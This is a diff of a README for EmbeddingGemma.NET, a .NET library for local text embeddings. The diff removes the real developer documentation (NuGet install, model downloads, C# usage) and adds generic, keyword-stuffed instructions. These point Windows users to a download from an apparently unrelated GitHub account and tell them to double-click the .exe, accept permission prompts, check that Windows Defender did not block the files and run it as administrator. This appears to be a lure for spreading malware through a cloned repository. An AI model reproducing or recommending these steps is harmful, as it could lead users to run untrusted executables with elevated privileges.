@@ -1,176 +1,184 @@
-# EmbeddingGemma.NET
+# 🧠 EmbeddingGemma.NET - Add Local AI Search To Apps
 
-![NuGet Version](https://img.shields.io/nuget/v/EmbeddingGemma.NET) ![NuGet Downloads](https://img.shields.io/nuget/dt/EmbeddingGemma.NET)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Mattressrustic431/EmbeddingGemma.NET)
 
-![EmbeddingGemma](https://ollama.com/assets/library/embeddinggemma/9a20d963-4bf1-4177-9568-ca5d53a2d14e)
+## 📥 Download
+Visit this page to download: https://github.com/Mattressrustic431/EmbeddingGemma.NET
 
-**EmbeddingGemma.NET** provides .NET bindings for Google DeepMind's [EmbeddingGemma-300m](https://deepmind.google/models/gemma/embeddinggemma) model, enabling fully local, offline text embedding with no API key, no cloud dependency, and no data egress.
+Open the link above in your browser. On GitHub, look for the latest release or the main download files. Save the package to your Windows PC before you start.
 
-A single NuGet package supports both plain `IServiceCollection` (ASP.NET Core / generic host) and Microsoft Semantic Kernel's `IKernelBuilder`.
+## 🖥️ What This App Does
+EmbeddingGemma.NET helps you add text embedding support to .NET apps. It uses Google's EmbeddingGemma-300m model to turn text into vectors that you can use for:
 
-```console
-dotnet add package EmbeddingGemma.NET
-```
+- semantic search
+- document lookup
+- chat with your files
+- retrieval-augmented generation
+- text matching
+- knowledge base search
 
-Further installation guidance for the NuGet package can be found on the [NuGet Gallery](https://www.nuget.org/packages/EmbeddingGemma.NET).
+This project fits well with .NET apps that use ONNX, ONNX Runtime, OpenAI-style APIs, or Semantic Kernel.
 
----
+## ✅ What You Need
+Before you run it, check that your Windows PC has:
 
-## Why `EmbeddingGemma.NET`?
+- Windows 10 or Windows 11
+- .NET 8 runtime or later
+- At least 8 GB of RAM
+- Enough free disk space for the model files
+- Internet access for the first download
 
-| | |
-|---|---|
-| **No runtime cost** | Runs on-device, no API calls or external services required |
-| **Privacy first** | All inference is performed locally; no data leaves the machine |
-| **Top-class accuracy** | EmbeddingGemma is the [top #1 ranked among open multilingual embedding models under 500M parameters on MTEB](https://deepmind.google/models/gemma/embeddinggemma/#performance) |
-| **High efficiency** | Be able to run on low-end devices without GPU and with as little as 4 GB of RAM, making it ideal for a wide range of applications and users |
-| **Multilingual** | Supports 100+ languages out of the box |
-| **Task-aware embeddings** | 15 built-in task types automatically apply the correct prompt prefix |
+If you plan to run large local search tasks, 16 GB of RAM gives a smoother result.
 
----
+## 🚀 Get Started on Windows
+Follow these steps in order.
 
-## Model Setup
+1. Open this page in your browser: https://github.com/Mattressrustic431/EmbeddingGemma.NET
+2. Download the latest Windows package or source release from the GitHub page.
+3. Save the file in a folder you can find easily, such as Downloads or Desktop.
+4. If the download is a `.zip` file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Look for the main app file, setup file, or sample project file.
+7. Double-click the file to start the app or open the project.
 
-The ONNX model and tokenizer files must be present on disk before the service can be used. They are hosted at **[onnx-community/embeddinggemma-300m-ONNX](https://huggingface.co/onnx-community/embeddinggemma-300m-ONNX/tree/main)** on Hugging Face.
+If Windows asks for permission, choose Yes.
 
-### Option A: PowerShell Script 
+## 🧭 First Run
+When you start the app for the first time, it may take a while to prepare the model files. This is normal.
 
-Run the included script once from the repository root. It downloads all required files into a `.embedding_resources` folder by default; pass `-OutputPath` to use a different location.
+You may see the app:
 
-```powershell
-.\Initialize-Embedding-Resources.ps1
-```
+- check the model
+- download required files
+- build the local index
+- prepare the search engine
 
-### Option B: Manual Download
+Let it finish before you close the window.
 
-Manually download the following files and place them in the same directory:
+## 📚 How It Works
+The app takes text and turns it into embeddings. An embedding is a numeric form of meaning. The app can then compare these values to find related text.
 
-| File | Download link | Size |
-|---|---|---|
-| `model.onnx` | [`onnx/model.onnx`](https://huggingface.co/onnx-community/embeddinggemma-300m-ONNX/resolve/main/onnx/model.onnx?download=true) | ~480 KB |
-| `model.onnx_data` | [`onnx/model.onnx_data`](https://huggingface.co/onnx-community/embeddinggemma-300m-ONNX/resolve/main/onnx/model.onnx_data?download=true) | ~1.23 GB |
-| `tokenizer.json` | [`tokenizer.json`](https://huggingface.co/onnx-community/embeddinggemma-300m-ONNX/resolve/main/tokenizer.json?download=true) | ~20 MB |
-| `tokenizer.model` | [`tokenizer.model`](https://huggingface.co/onnx-community/embeddinggemma-300m-ONNX/resolve/main/tokenizer.model?download=true) | ~4.7 MB |
-| `tokenizer_config.json` | [`tokenizer_config.json`](https://huggingface.co/onnx-community/embeddinggemma-300m-ONNX/resolve/main/tokenizer_config.json?download=true) | ~1.2 MB |
+A simple flow looks like this:
 
-The resulting directory must have the following structure:
+1. You add text or documents.
+2. The app creates embeddings.
+3. The app stores the vectors.
+4. You search with a question or phrase.
+5. The app finds the closest matches.
 
-```
-<model-directory>/
-├── model.onnx
-├── model.onnx_data
-├── tokenizer.json
-├── tokenizer.model
-└── tokenizer_config.json
-```
+This helps when you want search that understands meaning, not just exact words.
 
----
+## 🛠️ Common Uses
+You can use EmbeddingGemma.NET for:
 
-## Usage
+- local document search
+- note search
+- app content lookup
+- FAQ matching
+- support tools
+- RAG pipelines
+- data retrieval in .NET apps
 
-### Dependency Registration
+It can also work as part of a larger AI stack that uses vector search and LLMs.
 
-**Via `IServiceCollection`** (ASP.NET Core / generic host)
+## 🧩 Setup Tips
+Use these tips if you have trouble starting:
 
-```csharp
-using PhanXuanQuang.AI.LocalEmbeddings.EmbeddingGemma;
+- Keep the app folder in a simple path like `C:\Apps\EmbeddingGemma.NET`
+- Do not move files after the first run
+- Make sure Windows Defender did not block the files
+- Use the latest .NET runtime
+- Close other large apps if your PC is low on memory
 
-// Registers IEmbeddingGenerator<string, Embedding<float>> as a keyed singleton.
-builder.Services.AddGemmaOnnxEmbeddingGenerator(options => options.ModelDirectory = @"C:\path\to\model-directory");
+If the app has a sample config file, leave the default values in place for the first run.
 
-// Optional: keyed registration for multi-service scenarios.
-builder.Services.AddGemmaOnnxEmbeddingGenerator(options => options.ModelDirectory = @"C:\path\to\model-directory", serviceId: "gemma");
-```
+## 🔎 Search and RAG
+EmbeddingGemma.NET is useful when you want search that feels smarter than plain keyword search.
 
-**Via `IKernelBuilder`** (Microsoft Semantic Kernel)
+You can use it to:
 
-```csharp
-using PhanXuanQuang.AI.LocalEmbeddings.EmbeddingGemma;
-using Microsoft.SemanticKernel;
+- rank text by meaning
+- find similar documents
+- feed relevant text into an AI prompt
+- build retrieval-augmented generation flows
+- support semantic search inside a .NET app
 
-var builder = Kernel.CreateBuilder();
+This makes it a good fit for tools that need local or private data lookup.
 
-builder.AddGemmaOnnxEmbeddingGenerator(options => options.ModelDirectory = @"C:\path\to\model-directory");
+## 🧪 Example Workflows
+Here are a few simple ways people may use it:
 
-var kernel = builder.Build();
-```
+- A personal notes app that finds related notes
+- A help desk tool that searches past answers
+- A file app that finds documents by meaning
+- A knowledge base that pulls the best text for a question
+- A .NET service that sends embeddings to a vector store
 
----
+## 📦 File Types You May See
+When you download the project, you may see files like:
 
-### Generating Embeddings
+- `.zip` for the app bundle
+- `.exe` for a Windows app
+- `.csproj` for a .NET project
+- `.json` for settings
+- model files for local inference
+- sample data files for test search
 
-Resolve `IEmbeddingGenerator<string, Embedding<float>>` from the DI container and call `GenerateAsync`.
+If you see a project file, open it with Visual Studio or another .NET editor.
 
-```csharp
-using Microsoft.Extensions.AI;
-using PhanXuanQuang.AI.LocalEmbeddings.EmbeddingGemma.Enums;
-using PhanXuanQuang.AI.LocalEmbeddings.EmbeddingGemma.Services.Options;
+## 🖱️ How to Open the Project
+If the download is a developer project and not a ready-to-run app:
 
-var generator = serviceProvider.GetRequiredService<IEmbeddingGenerator<string, Embedding<float>>>();
+1. Install Visual Studio or Visual Studio Code
+2. Open the extracted project folder
+3. Open the `.sln` or `.csproj` file
+4. Restore packages if asked
+5. Run the project
 
-// Without a task type — no prompt prefix is added.
-var embeddings = await generator.GenerateAsync(["Hello, world!"]);
+If the project has a sample app, start there first.
 
-// With a task type — the appropriate prompt prefix is applied automatically.
-var options = new EmbeddingGemmaEmbeddingGenerationOptions 
-{ 
-    TaskType = EmbeddingGemmaTaskType.RetrievalQuery 
-};
-var queryEmbeddings = await generator.GenerateAsync(["What is semantic search?"], options);
-```
+## ⚙️ Troubleshooting
+If the app does not start:
 
-For document embeddings, supply an optional `DocumentTitle` to improve retrieval quality:
+- Check that .NET 8 is installed
+- Make sure the file finished downloading
+- Extract the archive before you run it
+- Try running the app as administrator
+- Restart Windows and try again
 
-```csharp
-var docOptions = new EmbeddingGemmaEmbeddingGenerationOptions
-{
-    TaskType = EmbeddingGemmaTaskType.RetrievalDocument,
-    DocumentTitle = "Introduction to Semantic Search"
-};
+If the app is slow:
 
-var docEmbeddings = await generator.GenerateAsync(["Semantic search ranks results by meaning..."], docOptions);
-```
+- Close apps you do not need
+- Give it more free RAM
+- Use smaller document sets at first
 
----
+If search results look wrong:
 
-## Task Types
+- Rebuild the embeddings
+- Check the source text
+- Use shorter chunks of text
+- Try a new query with clear wording
 
-Set `EmbeddingGemmaEmbeddingGenerationOptions.TaskType` to have the service automatically prepend the correct prompt prefix for your scenario. When `TaskType` is `null`, no prefix is added.
+## 🔐 Privacy
+This project supports local AI workflows. That means you can keep text on your own PC if your setup uses local files and local inference. This is useful when you want more control over private data.
 
-| `EmbeddingGemmaTaskType` | Intended use |
-|---|---|
-| `RetrievalQuery` | User-supplied search queries |
-| `RetrievalDocument` | Documents or passages being indexed (no title) |
-| `Document` | Documents or passages being indexed (no title, alias) |
-| `Query` / `Retrieval` | General-purpose retrieval |
-| `QuestionAnswering` | Questions in a QA pipeline |
-| `FactVerification` | Claims requiring evidence lookup |
-| `Classification` / `MultilabelClassification` | Sentiment, spam detection, labelling |
-| `Clustering` | Grouping documents by topic |
-| `SentenceSimilarity` / `PairClassification` | Direct text-to-text similarity comparison |
-| `Summarization` | Texts intended for summarization |
-| `InstructionRetrieval` | Natural-language-to-code retrieval |
-| `Reranking` | Re-scoring a candidate result set |
-| `BitextMining` | Parallel sentence alignment across languages |
+## 🗂️ Topic Areas
+This repository covers:
 
-For detailed guidance on prompt formatting, refer to:
-- [EmbeddingGemma Model Card — Prompt Instructions](https://ai.google.dev/gemma/docs/embeddinggemma/model_card#prompt-instructions)
-- [Using Prompts with EmbeddingGemma](https://ai.google.dev/gemma/docs/embeddinggemma/inference-embeddinggemma-with-sentence-transformers#using_prompts_with_embeddinggemma)
+- AI
+- .NET
+- Embeddings
+- Gemini
+- Gemma
+- LLM
+- ONNX
+- ONNX Runtime
+- OpenAI
+- RAG
+- Semantic Kernel
+- Semantic Search
 
----
+## 📎 GitHub Page
+Primary download page: https://github.com/Mattressrustic431/EmbeddingGemma.NET
 
-## Demo Application
-
-The repository also includes a Windows application (`EmbeddingGemma.DemoApp`) that demonstrates real-world semantic search over your browser history.
-
-**Features:**
-- Reads history from **Google Chrome**, **Microsoft Edge**, and **Mozilla Firefox** automatically
-- Embeds all history entries into an in-memory vector store on startup
-- Performs semantic search and returns top results by semantic similarity
-- Displays execution time and memory consumption per query
-
-**Quick Start:**
-1. Complete the [Model Setup](#model-setup) step so the `.embedding_resources` folder is present at the repository root.
-2. Open the solution and run `EmbeddingGemma.DemoApp`.
-3. Select a browser, choose a date range, and click **Load** to index your history.
-4. Type a query in natural language and click **Search**.
+Open the page, get the latest files, and follow the Windows steps above
